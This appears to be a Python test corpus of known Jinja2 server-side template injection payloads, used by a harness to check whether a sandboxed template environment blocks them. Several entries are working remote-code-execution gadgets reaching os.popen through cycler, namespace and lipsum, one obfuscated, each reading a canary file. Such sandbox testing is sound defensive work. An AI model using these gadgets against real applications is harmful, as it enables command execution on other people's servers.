# S4 pilot corpus — known CWE-1336 (Jinja2 SSTI) escape gadgets
# Each entry: id, name, template string, and what counts as a successful escape.
# All payloads are NON-DESTRUCTIVE: the RCE-class payloads only READ a canary
# file whose content is checked in the rendered output.
# Placeholders: {CANARY} is replaced by the harness with the canary path.
#
# Sources: PortSwigger SSTI methodology; jinja2 docs on sandbox;
# classic documented SSTI gadgets (cycler/namespace/lipsum -> os.popen).
CORPUS = [
    {
        "id": "P1",
        "name": "engine-detection",
        "class": "detection",
        "template": "{{ 7*7 }}",
        "expect": "49",
        "note": "Proves attacker-controlled text reaches a live template engine.",
    },
    {
        "id": "P2",
        "name": "dunder-attribute-read",
        "class": "sandbox-probe",
        "template": "{{ ''.__class__.__mro__[1].__subclasses__() | length }}",
        "expect": "int-gt-100",
        "note": "Blocked by SandboxedEnvironment (dunder attribute access denied); "
                "succeeds on unsandboxed jinja2.Template.",
    },
    {
        "id": "P3",
        "name": "rce-cycler-popen",
        "class": "rce",
        "template": "{{ cycler.__init__.__globals__.os.popen('cat {CANARY}').read() }}",
        "expect": "CANARY",
        "note": "Classic documented SSTI RCE gadget: reaches os.popen via the "
                "cycler object's __init__.__globals__. Blocked by "
                "SandboxedEnvironment (__globals__ denied).",
    },
    {
        "id": "P4",
        "name": "rce-namespace-popen",
        "class": "rce",
        "template": "{{ namespace.__init__.__globals__.os.popen('cat {CANARY}').read() }}",
        "expect": "CANARY",
        "note": "Same primitive as P3 via the namespace object.",
    },
    {
        "id": "P5",
        "name": "rce-lipsum-popen",
        "class": "rce",
        "template": "{{ lipsum.__globals__.os.popen('cat {CANARY}').read() }}",
        "expect": "CANARY",
        "note": "Same primitive as P3 via the lipsum global.",
    },
    {
        "id": "P6",
        "name": "rce-join-obfuscated",
        "class": "rce",
        "template": "{{ (cycler.__init__|attr('__glo'+'bals__')).os.popen('cat {CANARY}').read() }}",
        "expect": "CANARY",
        "note": "attr() filter + string concatenation: a simple sandbox-filter "
                "bypass variant. Expected blocked by SandboxedEnvironment (attr "
                "filter is restricted for dunder lookups).",
    },
    # ---- sandbox-bypass variant analysis (documented historical bypass attempts)
    {
        "id": "B1",
        "name": "bypass-tuple-dunder",
        "class": "bypass",
        "template": "{{ ().__class__.__base__.__subclasses__() | length }}",
        "expect": "int-gt-100",
        "note": "Tuple-based dunder traversal; blocked by SandboxedEnvironment.",
    },
    {
        "id": "B2",
        "name": "bypass-dict-dunder",
        "class": "bypass",
        "template": "{{ {'a': 1}.__class__.__mro__ | length }}",
        "expect": "int-gt-0",
        "note": "Dict-based dunder traversal; blocked by SandboxedEnvironment.",
    },
    {
        "id": "B3",
        "name": "bypass-attr-filter-chain",
        "class": "bypass",
        "template": "{{ cycler|attr('__init__')|attr('__globals__')|attr('get')('os') }}",
        "expect": "module",
        "note": "attr-filter chain reaching os module; blocked by "
                "SandboxedEnvironment (dunder attr lookups denied).",
    },
    {
        "id": "B4",
        "name": "control-namespace-attr",
        "class": "bypass",
        "template": "{{ namespace(x=1).x }}",
        "expect": "one",
        "note": "Benign namespace attribute read; allowed even in sandbox "
                "(no dunder involved). Control: distinguishes a sandbox "
                "that blocks dunders from one that blocks everything.",
    },
]
